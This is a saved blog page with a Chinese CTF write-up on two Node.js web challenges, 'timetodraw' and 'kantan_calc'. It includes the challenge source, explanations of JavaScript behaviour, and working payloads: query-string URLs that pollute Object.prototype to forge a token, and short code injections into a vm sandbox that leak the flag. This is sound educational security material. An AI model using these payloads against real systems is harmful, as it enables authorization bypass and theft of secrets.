@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>[JS专项训练]课后作业34 | Lanb0's blog|一个默默无闻的网安爱好者</title><meta name="author" content="lanb0"><meta name="copyright" content="lanb0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="timetodraw123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const express &#x3D; require(&quot;express&quot;);const cookieParser &#x3D; require(&amp;#x27">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[JS专项训练]课后作业34">
+<meta property="og:url" content="https://wustzhb.github.io/2023/08/06/[JS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83]%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A34/index.html">
+<meta property="og:site_name" content="Lanb0&#39;s blog|一个默默无闻的网安爱好者">
+<meta property="og:description" content="timetodraw123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const express &#x3D; require(&quot;express&quot;);const cookieParser &#x3D; require(&amp;#x27">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wustzhb.github.io/img/head.jpg">
+<meta property="article:published_time" content="2023-08-06T14:50:00.000Z">
+<meta property="article:modified_time" content="2023-08-13T13:12:40.108Z">
+<meta property="article:author" content="lanb0">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JavaScript">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wustzhb.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://wustzhb.github.io/2023/08/06/[JS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83]%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A34/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[JS专项训练]课后作业34',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-13 21:12:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lanb0's blog|一个默默无闻的网安爱好者"><span class="site-name">Lanb0's blog|一个默默无闻的网安爱好者</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[JS专项训练]课后作业34</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-06T14:50:00.000Z" title="发表于 2023-08-06 22:50:00">2023-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-13T13:12:40.108Z" title="更新于 2023-08-13 21:12:40">2023-08-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/JS%E4%B8%93%E9%A1%B9/">JS专项</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="timetodraw"><a href="#timetodraw" class="headerlink" title="timetodraw"></a>timetodraw</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secret = <span class="built_in">require</span>(<span class="string">&quot;./secret&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(secret.<span class="property">FLAG</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> canvas = &#123;</span><br><span class="line">    ...<span class="title class_">Array</span>(<span class="number">128</span>).<span class="title function_">fill</span>(<span class="literal">null</span>).<span class="title function_">map</span>(<span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">128</span>).<span class="title function_">fill</span>(<span class="string">&quot;#FFFFFF&quot;</span>))</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hash</span> = (<span class="params">token</span>) =&gt; crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(token).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">signedCookies</span>.<span class="property">user</span>)</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;user&#x27;</span>, &#123; <span class="attr">admin</span>: <span class="literal">false</span> &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/canvas&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(canvas);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/draw&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, color &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.<span class="title function_">toString</span>();</span><br><span class="line">    res.<span class="title function_">json</span>(canvas);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/promote&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">yo_i_want_to_be</span> === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;user&#x27;</span>, &#123; <span class="attr">admin</span>: <span class="literal">true</span> &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Great, you are admin now. &lt;a href=&quot;/&quot;&gt;[Keep Drawing]&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userData = &#123; <span class="attr">isGuest</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">signedCookies</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">signedCookies</span>.<span class="property">user</span>.<span class="property">admin</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        userData.<span class="property">isGuest</span> = <span class="literal">false</span>;</span><br><span class="line">        userData.<span class="property">isAdmin</span> = req.<span class="property">cookies</span>.<span class="property">admin</span>;</span><br><span class="line">        userData.<span class="property">token</span> = secret.<span class="property">ADMIN_TOKEN</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">token</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">token</span>.<span class="title function_">match</span>(<span class="regexp">/[0-9a-f]&#123;16&#125;/</span>)</span><br><span class="line">        &amp;&amp; <span class="title function_">hash</span>(<span class="string">`<span class="subst">$&#123;req.connection.remoteAddress&#125;</span><span class="subst">$&#123;req.query.token&#125;</span>`</span>) === userData.<span class="property">token</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(secret.<span class="property">FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&quot;0.0.0.0&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="思路-JS原型链污染"><a href="#思路-JS原型链污染" class="headerlink" title="思路:JS原型链污染"></a>思路:JS原型链污染</h1><p>&#x2F;api&#x2F;draw路由下，因为不是merge没有提前解析嵌套对象，所以可以用字符串键值对形式的__proto__污染Object.prototype</p>
+<p>&#x2F;flag路由下，不进入 <code>if (req.signedCookies.user &amp;&amp; req.signedCookies.user.admin === true)</code> ， <code>=== userData.token)</code>的token就会去原型链上找，所以我们只需要提前准备一个符合math条件的token，然后计算remoteAddress+token的hash就可以得到FLAG</p>
+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p>第一步：污染</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.40.131:8003/api/draw?x=__proto__&amp;y=token&amp;color=0f944383bd6e751b9e4ede2a41cee38ab9bf694c18ec0cc8875e03c476a0a412</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>const hash &#x3D; (token) &#x3D;&gt; crypto.createHash(‘sha256’).update(token).digest(‘hex’);</p>
+<p>console.log(hash(<code>192.168.40.11111111111111111</code>))</p>
+<p>提前计算token</p>
+</blockquote>
+<p>第二步:获取FLAG</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.40.131:8003/flag?token=1111111111111111</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="kantan-calc"><a href="#kantan-calc" class="headerlink" title="kantan_calc"></a>kantan_calc</h1><p>源码:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="built_in">require</span>(<span class="string">&#x27;./flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> code = req.<span class="property">query</span>.<span class="property">code</span> + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (code &amp;&amp; code.<span class="property">length</span> &lt; <span class="number">30</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> result = vm.<span class="title function_">runInNewContext</span>(<span class="string">`&#x27;use strict&#x27;; (function () &#123; return <span class="subst">$&#123;code&#125;</span>; /* <span class="subst">$&#123;FLAG&#125;</span> */ &#125;)()`</span>, <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), &#123; <span class="attr">timeout</span>: <span class="number">100</span> &#125;);</span><br><span class="line">      output = result + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (output.<span class="title function_">includes</span>(<span class="string">&#x27;zer0pts&#x27;</span>)) &#123;</span><br><span class="line">        output = <span class="string">&#x27;Error: please do not exfiltrate the flag&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      output = <span class="string">&#x27;Error: error occurred&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    output = <span class="string">&#x27;Error: invalid code&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Kantan Calc&#x27;</span>, output &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;app.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="所需知识"><a href="#所需知识" class="headerlink" title="所需知识"></a>所需知识</h2><h3 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> a=(<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11111</span>),<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//11111</span></span><br><span class="line"><span class="comment">//3</span></span><br></pre></td></tr></table></figure>
+
+<p>逗号运算符的特点是：</p>
+<ul>
+<li>它可以将多个表达式连接起来，按照从左到右的顺序依次执行。</li>
+<li>它只会返回最右边的表达式的值，并忽略其他表达式的值。</li>
+</ul>
+<h3 id="加号运算"><a href="#加号运算" class="headerlink" title="加号运算"></a>加号运算</h3><ul>
+<li>在js里，函数是一种特殊的对象，它有一个内置的属性叫做 <strong>toString</strong> ，这个属性是一个方法，它可以返回函数的源码字符串</li>
+<li>当我们在js里使用 <strong>+</strong> 运算符时，它可以进行两种操作：<strong>数值相加</strong>或者<strong>字符串拼接</strong></li>
+<li>如果 <strong>+</strong> 运算符的两个操作数都是数值，那么它会进行数值相加。例如：<code>1 + 2</code>会返回<code>3</code>。</li>
+<li>如果 <strong>+</strong> 运算符的两个操作数中有一个是字符串，那么它会进行字符串拼接。例如：<code>&#39;1&#39; + 2</code>会返回<code>&#39;12&#39;</code>。</li>
+<li>如果 <strong>+</strong> 运算符的两个操作数中有一个是对象，那么它会先调用对象的 <strong>toString</strong> 方法，将对象转换为字符串，然后进行字符串拼接。例如：<code>[1, 2] + 3</code>会返回<code>&#39;1,23&#39;</code>。</li>
+<li>因此，当我们在js里给一个函数名加上一个数字或者字符时，就相当于用 <strong>+</strong> 运算符将函数对象和数字或者字符进行运算。这时，js会先调用函数对象的 <strong>toString</strong> 方法，将函数对象转换为源码字符串，然后和数字或者字符进行字符串拼接。例如：<code>function foo() &#123;return &#39;bar&#39;;&#125; + 1</code>会返回<code>&#39;function foo() &#123;return &#39;bar&#39;;&#125;&#39;</code>。</li>
+</ul>
+<h3 id="表达式函数体"><a href="#表达式函数体" class="headerlink" title="表达式函数体"></a>表达式函数体</h3><p>下面的代码定义了一个计算平方的箭头函数，并使用了表达式函数体：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">square</span> = x =&gt; (x * x);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个箭头函数等价于下面的普通函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">square</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>表达式函数体只能用在箭头函数表达式中，不能用在普通的函数声明或函数表达式中。</li>
+<li>表达式函数体只能有一个表达式，不能有多个语句或代码块。换句话说，只能存在一个返回值，可以与逗号运算符联动</li>
+<li>表达式函数体不需要用大括号{}括起来，而是用圆括号()括起来。</li>
+<li>表达式函数体会隐式地返回表达式的值，不需要写return语句。</li>
+</ul>
+</blockquote>
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>因为之前没有接触过js的加号还能打印源码，所以一直在往逃逸上面想，但是<code>Object.create(null)</code>决定了无法this逃出去，尝试本地取消长度限制可以用vm2的payload逃逸，但是长度明显大于30</p>
+<p>只能找wp看，发现了很多新知识点都写到上面的所需知识中了</p>
+<p>读取源码，最简单的方式就是arguments.callee.toString(),但是严格模式下不允许，所以只能用加号运算的特性来打印源码</p>
+<p>但是加号运算首先得有变量名，而题目的vm预置代码里用的是匿名函数，所以需要我们自己创建一个新函数，而且字数要尽量少，所以选择箭头函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;);this.a=()=&gt;&#123;return a+1/*</span><br></pre></td></tr></table></figure>
+
+<p>这样只占用了28个字符，但很遗憾，不能一下子读完flag</p>
+<blockquote>
+<p>这里有个小疑惑，(a&#x3D;()&#x3D;&gt;(1))这样的写法在我的本地nodejs环境下的严格模式是不能用的，但为什么在vm中的严格模式就可以呢?</p>
+<p>而且});(a&#x3D;()&#x3D;&gt;{return(a+1)[29]&#x2F;*这个payload在我本地搭建的题目环境是可以一个一个字符读出来的，但是在docker的环境下就会报错，可能是nodejs版本问题?</p>
+<p>如果必须加this的话长度就超过29了，我们就以最正规的解法来做吧</p>
+</blockquote>
+<p><code>return</code>也占用了6个字符，我们可以用表达式函数体来省略<code>return</code>字符串</p>
+<p>但问题又来了，表达式函数体不能用<code>&#123;&#125;</code>，无法闭合结尾的<code>&#125;</code>，所以还是放弃利用表达式函数体</p>
+<p>看看其他地方能不能简化，<code>&#125;);</code>来结束一个函数体的话也会浪费字符长度，我们可以用上面提到的逗号运算符来在后面跟着执行我们自己的函数，而不是先结束再创建</p>
+<p>而且这样我们可以不需要注释符，因为本来就是一个正常的js语句</p>
+<p>最后利用逗号运算符返回最后一个逗号后的表达式代码的特性，就可以一个一个读取flag的内容了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;,this.a=()=&gt;&#123;return(a+1)[20]</span><br></pre></td></tr></table></figure>
+
+
+
